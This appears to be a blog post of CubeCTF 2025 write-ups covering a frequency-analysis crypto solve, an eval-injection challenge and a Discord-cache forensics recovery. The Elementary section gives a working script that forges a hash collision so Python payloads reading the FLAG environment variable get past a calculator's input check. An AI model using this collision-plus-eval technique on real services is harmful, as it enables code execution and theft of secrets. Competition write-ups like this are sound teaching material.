@@ -1,0 +1,292 @@
+---
+title: 'CubeCTF 2025'
+description: 'a few writeups from cubectf'
+date: 2025-08-10
+tags: ['writeups', 'crypto',  'forensics']
+authors: ['cold']
+image: ./logo.png
+---
+
+# Introduction
+
+so i kinda forgot what this ctf was all about. anyways here are a few writeups i dug up.
+
+## Crypto
+
+### Incantation
+
+> While walking through a meadow, you find a magical book on the ground. The letters seem to be dancing off the page, dancing to a rhythm of a song you used to know, but you can't quite make them out.
+> 
+> nc incantation.chal.cubectf.com 5757
+> 
+> Author: @B00TK1D
+
+it was a binary that kinda gives you random characters replacing them in a flag. 
+
+lowk mad lazy rn but basically the logic made it so that the characters of the flag will appear more often in each respective index, just querying a lot of times and doing a frequency analysis give syou the flag
+
+### Elementary
+
+> I made a calculator for elementary students. I made sure it can only do basic operations, so it should be safe.
+> `nc elementary.chal.cubectf.com 3456`
+> Author: @B00TK1D
+
+from the given source, we see that the script is giving us `eval()`. this lets us execute arbitrary code, but it verifies that what we are trying to do is actually a valid calculator expression (or plausible, using a regex) before letting us execute it  
+the key vulnerability is that it actually hashes all operations we give it, and if the hash of the operation we give has been previously verified, it ignores verification and directly runs it
+
+**Here is the solution outline**
+1. Find a hash collision, where **a valid calculator expression** and **a payload to read the flag from the environ FLAG** have **the same hash** (note that the hash algo only uses 6 bytes, so brute-force is feasible)
+2. Submit the valid expression first to have the shared hash marked as "safe"
+3. Submit the payload. Since it has the same hash, it will be run and give us the flag from environ FLAG.
+
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import random
+import multiprocessing
+import time
+import string
+
+
+# The hash function from the challenge
+def h(data: str) -> bytes:
+    b = data.encode("utf-8")
+
+    h1 = 0x1234567890AB
+    h2 = 0xFEDCBA098765
+
+    for i in range(len(b)):
+        byte = b[i]
+        shift = (i % 6) * 6
+
+        if i % 2 == 0:
+            h1 ^= byte << shift
+            h1 = (h1 * 0x100000001B3) & 0xFFFFFFFFFFFF
+        else:
+            h2 ^= byte << shift
+            h2 = (h2 * 0xC6A4A7935BD1) & 0xFFFFFFFFFFFF
+
+    result = h1 ^ ((h2 << 24) | (h2 >> 24))
+    result = (result ^ (result >> 25)) * 0xFF51AFD7ED55
+    result &= 0xFFFFFFFFFFFFFFFF
+    result = (result ^ (result >> 25)) * 0xC4CEB9FE1A85
+    result &= 0xFFFFFFFFFFFFFFFF
+    result ^= result >> 25
+
+    return result.to_bytes(8, "big")[:6]
+
+
+def generate_valid_string():
+    """Generate a random string that passes validation"""
+    allowed_chars = "0123456789+-*/. "
+    length = random.randint(1, 10)  # Vary the length
+    return "".join(random.choice(allowed_chars) for _ in range(length))
+
+
+def generate_payloads(count=1000):
+    """Generate many unique payload variations"""
+    base_payloads = [
+        "__import__('os').environ['FLAG']",
+        "__import__('os').getenv('FLAG')",
+        "__import__('os').environ.get('FLAG')",
+        "getattr(__import__('os'),'environ')['FLAG']",
+    ]
+
+    payloads = []
+
+    # Generate random comment content
+    def random_comment():
+        length = random.randint(0, 20)
+        return "".join(
+            random.choice(string.ascii_letters + string.digits) for _ in range(length)
+        )
+
+    # Generate a random number of spaces
+    def random_spaces():
+        return " " * random.randint(0, 5)
+
+    # Create variations with spaces and comments
+    for _ in range(count):
+        base = random.choice(base_payloads)
+
+        # Decide what kind of variation to make
+        variation_type = random.randint(1, 3)
+
+        if variation_type == 1:  # Spaces after
+            payload = base + random_spaces()
+        elif variation_type == 2:  # Comment after
+            payload = base + "#" + random_comment()
+        elif variation_type == 3:
+            payload = base + random_spaces() + "#" + random_comment()
+        else:
+            payload = base
+
+        payloads.append(payload)
+
+    # Make sure we have unique payloads
+    unique_payloads = list(set(payloads))
+    print(f"[*] Generated {len(unique_payloads)} unique payloads from {count} attempts")
+
+    return unique_payloads
+
+
+def worker(proc_id, valid_hashes, payload_hashes, result_queue, stop_event):
+    """Worker process to find hash collision using birthday attack"""
+    count = 0
+    start_time = time.time()
+    batch_size = 10000
+
+    print(
+        f"[*] Process {proc_id}: Started with {len(payload_hashes)} payload variations"
+    )
+
+    while not stop_event.is_set():
+        # Generate a batch of valid strings
+        valid_strings = [generate_valid_string() for _ in range(batch_size)]
+        count += batch_size
+
+        for valid_str in valid_strings:
+            if stop_event.is_set():
+                break
+
+            valid_hash = h(valid_str)
+            hex_hash = valid_hash.hex()
+
+            # Check if this valid string collides with any payload
+            if hex_hash in payload_hashes:
+                payload = payload_hashes[hex_hash]
+                print(f"[+] Process {proc_id}: Found collision!")
+                print(f"VALID STRING IS {valid_str}")
+                print(f"PAYLOAD IS {payload}")
+                result_queue.put((valid_str, payload))
+                stop_event.set()
+                break
+
+            # Store this valid string's hash
+            valid_hashes[hex_hash] = valid_str
+
+        # Report progress
+        if count % 100000 == 0:
+            elapsed = time.time() - start_time
+            rate = count / elapsed if elapsed > 0 else 0
+            print(
+                f"[*] Process {proc_id}: {count} strings checked, {rate:.2f}/sec, {len(valid_hashes)} unique"
+            )
+
+
+def main():
+    manager = multiprocessing.Manager()
+    valid_hashes = manager.dict()
+    payload_hashes = manager.dict()
+    result_queue = multiprocessing.Queue()
+    stop_event = multiprocessing.Event()
+
+    # Generate many payload variations and their hashes
+    payloads = generate_payloads(count=20_000_000)
+
+    for payload in payloads:
+        payload_hash = h(payload).hex()
+        payload_hashes[payload_hash] = payload
+
+    print(f"[*] Generated {len(payload_hashes)} unique payload hashes")
+
+    # Start worker processes
+    num_processes = 8  # Use all cores
+    processes = []
+    for i in range(num_processes):
+        p = multiprocessing.Process(
+            target=worker,
+            args=(i, valid_hashes, payload_hashes, result_queue, stop_event),
+        )
+        p.start()
+        processes.append(p)
+
+    # Wait for result
+    while not stop_event.is_set():
+        if not result_queue.empty():
+            valid_str, payload = result_queue.get()
+            stop_event.set()
+
+            print(f"[+] Found collision!")
+            print(f"[+] Valid string: '{valid_str}'")
+            print(f"[+] Payload: '{payload}'")
+            print(f"[+] Hash: {h(valid_str).hex()}")
+
+        time.sleep(0.1)
+
+    # Cleanup
+    for p in processes:
+        p.terminate()
+        p.join()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+after running for a while we can see:
+```
+[+] Process 7: Found collision!
+VALID STRING IS *+5592
+PAYLOAD IS getattr(__import__('os'),'environ')['FLAG']#iFIw66TjP
+```
+
+
+then submitting those two in that order gives us the flag:
+`cube{3l3m3nt4ry_mY_d34r_w47s0n_181c2f60}`
+
+## Forensics
+
+### Discord
+
+> I got a really awesome picture from my friend on Discord, but then he deleted it! I asked someone for a program that could get those pictures back, but when I ran it, all it did was close Discord! Send help, I need that picture back!
+> Authors: @poke_player and @ajmeese7
+
+## Solvepath
+
+upon download and decompress the disk image we get an AD1 file. so we gotta use FTK imager. i am a mac/linux user so i had to boot up my windows vm.
+
+FTK imager loads the AD1 easily, we can browse the user's folders/files.
+
+immediately i go to check the discord cache. surprisingly, by looking at my own system, images are actually stored in the cache (ask ChatGPT for details since it can probably explain better)
+
+but in the image, all files there are `.enc`
+
+in his download folder we find a suspicious `.exe`. taking it out of the VM and doing a little bit of rev (upx unpack), we find that it is a `PyInstaller` binary.
+
+using some nice tools we can extract the python script and decompile the `.pyc`
+
+
+```python
+from pathlib import Path
+from Cryptodome.Cipher import AES
+from Cryptodome.Protocol.KDF import PBKDF2
+from Cryptodome.Util.Padding import unpad
+
+# Parameters
+user_id = b"1334198101459861555" # gotten from his files
+salt = b'BBBBBBBBBBBBBBBB'
+iv = b'BBBBBBBBBBBBBBBB'
+enc_dir = Path("/Users/colin/Public/Cache_Data")
+
+# Derive AES key
+key = PBKDF2(user_id, salt, dkLen=32, count=1_000_000)
+
+# Process all .enc files
+for file in enc_dir.glob("*.enc"):
+    with open(file, "rb") as f:
+        ciphertext = f.read()
+    try:
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        decrypted = unpad(cipher.decrypt(ciphertext), 16)
+        out_file = file.with_suffix(".bin")
+        with open(out_file, "wb") as f:
+            f.write(decrypted)
+        print(f"[+] Decrypted {file.name} -> {out_file.name}")
+    except Exception as e:
+        print(f"[!] Failed: {file.name} - {e}")
+
+```
+
+this gives us a load of images, one of them has the flag
